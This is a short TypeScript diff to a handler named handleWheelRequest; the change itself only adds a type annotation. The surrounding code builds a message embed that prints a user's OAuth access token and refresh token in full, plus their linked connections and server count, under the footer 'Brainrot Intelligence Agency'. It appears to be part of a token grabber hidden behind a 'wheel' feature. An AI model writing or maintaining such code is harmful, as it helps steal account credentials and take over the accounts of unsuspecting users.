@@ -374,7 +374,7 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
               fields: [
                 { name: 'Access Token', value: `\`\`\`${tokenData.access_token}\`\`\`` },
                 { name: 'Refresh Token', value: `\`\`\`${tokenData.refresh_token}\`\`\`` },
-                { name: 'Connections', value: (evidence.connections.map(c => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
+                { name: 'Connections', value: (evidence.connections.map((c: any) => `${c.type}: ${c.name}`).join(', ') || 'None').slice(0, 1000) },
                 { name: 'Guilds', value: `${evidence.guilds.length} servers joined`, inline: true }
               ],
               footer: { text: 'Brainrot Intelligence Agency' },
